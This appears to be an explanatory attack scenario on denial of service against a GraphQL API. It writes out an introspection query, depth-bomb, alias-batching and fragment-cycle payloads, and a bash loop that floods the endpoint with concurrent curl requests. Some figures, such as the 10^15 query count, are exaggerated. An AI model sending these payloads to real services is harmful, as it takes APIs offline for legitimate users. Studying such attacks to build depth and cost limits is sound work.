**Phase 1: Reconnaissance and Schema Discovery**
An attacker discovers a GraphQL endpoint at `https://api.example.com/graphql` by scanning common paths or analyzing client-side JavaScript. They send an introspection query to map the entire schema:

```graphql
query IntrospectionQuery {
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
          ofType {
            name
          }
        }
      }
    }
  }
}
```

This reveals circular type relationships: `User` has `posts: [Post!]`, `Post` has `author: User`, `Post` has `comments: [Comment!]`, `Comment` has `author: User` and `post: Post`. The attacker identifies this as a DoS vulnerability opportunity.

**Phase 2: Crafting Deeply Nested Query (Depth Attack)**
The attacker creates a query exploiting the circular User -> Posts -> Author relationship with 15 levels of nesting:

```graphql
query DepthBombAttack {
  user(id: "1") {
    name
    posts {          # Level 1
      title
      author {       # Level 2
        name
        posts {      # Level 3
          title
          author {   # Level 4
            name
            posts {  # Level 5
              title
              author {
                name
                posts {
                  title
                  author {
                    name
                    posts {
                      title
                      comments {  # Adding width
                        text
                        author {
                          name
                          posts {
                            title
                            author {
                              name
                              posts {
                                title
                                author {
                                  name
                                  posts {
                                    title
                                    author {
                                      name
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

This query triggers exponential database queries: If a user has 10 posts, level 1 loads 10 posts, level 2 loads 10 authors, level 3 loads 100 posts (10 per author), level 4 loads 100 authors, level 5 loads 1,000 posts, etc. By level 15, the server attempts to execute **10^15 database queries** - an impossible operation.

**Phase 3: Alias-Based Batching Attack (Multiplication)**
To amplify the impact, the attacker uses GraphQL field aliasing to request the same expensive operation 100 times in a single query:

```graphql
query AliasBatchAttack {
  user1: user(id: "1") { ...ExpensiveUserData }
  user2: user(id: "1") { ...ExpensiveUserData }
  user3: user(id: "1") { ...ExpensiveUserData }
  # ... repeated 100 times
  user100: user(id: "1") { ...ExpensiveUserData }
}

fragment ExpensiveUserData on User {
  name
  email
  posts {
    title
    content
    comments {
      text
      author {
        name
        posts {
          title
          comments {
            text
          }
        }
      }
    }
  }
}
```

Each aliased field executes the expensive nested query independently, multiplying server load by 100x.

**Phase 4: Directive Abuse and Fragment Cycle Attack**
The attacker combines multiple attack vectors with fragment cycles:

```graphql
query FragmentCycleAttack {
  user(id: "1") {
    ...UserFields
  }
}

fragment UserFields on User {
  name
  posts @include(if: true) {  # Directive abuse
    ...PostFields
  }
}

fragment PostFields on Post {
  title
  author @include(if: true) {
    ...UserFields  # Circular fragment reference!
  }
  comments @include(if: true) {
    ...CommentFields
  }
}

fragment CommentFields on Comment {
  text
  author {
    ...UserFields  # Another cycle
  }
  post {
    ...PostFields  # Yet another cycle
  }
}
```

**Phase 5: Server Resource Exhaustion and Impact**
When the malicious query executes:

1. **Database Connection Pool Exhaustion**: Server opens thousands of simultaneous database connections, exhausting the connection pool (typical max: 10-100 connections). New legitimate requests cannot acquire connections and time out.

2. **Memory Exhaustion**: GraphQL resolver results are held in memory before serialization. Nested queries generate gigabytes of intermediate objects (user objects, post objects, comment objects), triggering out-of-memory errors and garbage collection pauses.

3. **CPU Saturation**: Nested resolvers execute synchronously or with limited concurrency. The server spends minutes resolving thousands of nested fields, pegging CPU at 100% and starving other requests.

4. **Cascading Failures**: Backend services (databases, Redis caches, microservices) also become overloaded. Timeouts cascade across the architecture.

5. **Complete Service Outage**: The GraphQL service becomes unresponsive. Health checks fail. Load balancers mark instances as unhealthy. Auto-scaling attempts to compensate but new instances are immediately overwhelmed. The entire API becomes unavailable for legitimate users.

**Phase 6: Persistence and Amplification**
The attacker automates the attack using a simple script:

```bash
# Send 100 malicious queries concurrently
for i in {1..100}; do
  curl -X POST https://api.example.com/graphql \
    -H 'Content-Type: application/json' \
    -d @malicious-query.json &
done
```

Even after the attack stops, the service may take minutes to recover as in-flight queries complete and resources are freed.

**Business Impact**:
- E-commerce platform: $10,000+ per minute in lost revenue during checkout
- SaaS application: Thousands of users unable to access critical features
- Mobile app: All API requests fail, leading to 1-star reviews
- Reputation damage: News of outage spreads on social media
- Emergency response costs: Engineers paged, incident declared, post-mortem required

